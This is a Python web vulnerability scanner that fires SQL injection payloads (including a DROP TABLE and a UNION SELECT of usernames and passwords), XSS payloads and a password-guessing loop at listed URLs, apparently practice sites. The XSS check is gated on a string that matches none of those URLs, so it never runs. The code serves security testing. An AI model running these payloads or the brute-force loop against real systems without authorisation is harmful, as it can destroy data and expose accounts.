import requests
import time
from urllib.parse import quote


class VulnerabilityScanner:
    def __init__(self, target_url, timeout=5, delay=1, verify_ssl=False):
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (AutoVulnTester/1.0)',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en'
        }

    def sql_injection_test(self):
        """Test for SQL Injection vulnerabilities"""
        test_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "1' ORDER BY 1--",
            "1' AND 1=CONVERT(int,@@version)--",
            "1; DROP TABLE users--",
            "1' UNION SELECT null,username,password FROM users--"
        ]

        for payload in test_payloads:
            test_url = f"{self.target_url}?cat={quote(payload)}"
            try:
                response = requests.get(
                    test_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                error_patterns = [
                    "sql syntax", "unclosed quotation", "syntax error",
                    "mysql_fetch", "mysql_num_rows", "mysql error", "warning: mysql"
                ]

                if any(error in response.text.lower() for error in error_patterns):
                    self.vulnerabilities.append({
                        'type': 'SQLi',
                        'payload': payload,
                        'url': test_url,
                        'confidence': 'High'
                    })
                    return True

                time.sleep(self.delay)

            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
                continue

        return False

    def xss_test(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)"
        ]

        for payload in xss_payloads:
            test_url = f"{self.target_url}?query={quote(payload)}"
            try:
                response = requests.get(
                    test_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    verify=False
                )

                if payload.lower() in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'payload': payload,
                        'url': test_url,
                        'confidence': 'Medium'
                    })
                    return True
                time.sleep(self.delay)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
                continue
        return False

    def brute_force_test(self, login_url, username, passwords, success_indicator="Welcome"):
        for pwd in passwords:
            data = {
                'username': username,
                'password': pwd
            }
            try:
                response = requests.post(
                    login_url,
                    data=data,
                    headers=self.headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                if success_indicator.lower() in response.text.lower():
                    vuln_info = {
                        'type': 'BruteForce',
                        'payload': f'{username}:{pwd}',
                        'url': login_url,
                        'confidence': 'High'
                    }
                    self.vulnerabilities.append(vuln_info)
                    return vuln_info
                time.sleep(self.delay)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
                continue
        return None

    def generate_report(self, filename=None):
        report = {
            'target': self.target_url,
            'scan_time': time.strftime("%Y-%m-%d %H:%M:%S"),
            'vulnerabilities': self.vulnerabilities
        }

        if filename:
            import json
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)

        return report


if __name__ == "__main__":
    print("AutoVulnTester - Web Vulnerability Scanner\n")

    sites_to_test = [
        "http://testphp.vulnweb.com/listproducts.php",
        "https://vulnerable-web.com/xss/level1.php",
        "http://zero.webappsecurity.com/login.html"
    ]

    for site in sites_to_test:
        print(f"Scanning {site}...")
        scanner = VulnerabilityScanner(
            target_url=site,
            timeout=5,
            delay=1,
            verify_ssl=False
        )

        if "listproducts.php" in site:
            scanner.sql_injection_test()

        if "xss-game" in site:
            scanner.xss_test()

        if "login" in site:
            scanner.brute_force_test(
                login_url=site,
                username="admin",
                passwords=["1234", "admin", "password", "admin123"],
                success_indicator="Welcome"
            )

        if scanner.vulnerabilities:
            print("Vulnerabilities Found:")
            for vuln in scanner.vulnerabilities:
                print(f"""- {vuln['type']} (Confidence: {vuln['confidence']})
  Payload: {vuln['payload']}
  URL: {vuln['url']}""")

            report_file = f"report_{site.replace('://', '_').replace('/', '_')}.json"
            scanner.generate_report(report_file)
            print(f"Report saved to {report_file}\n")
        else:
            print("No vulnerabilities found\n")
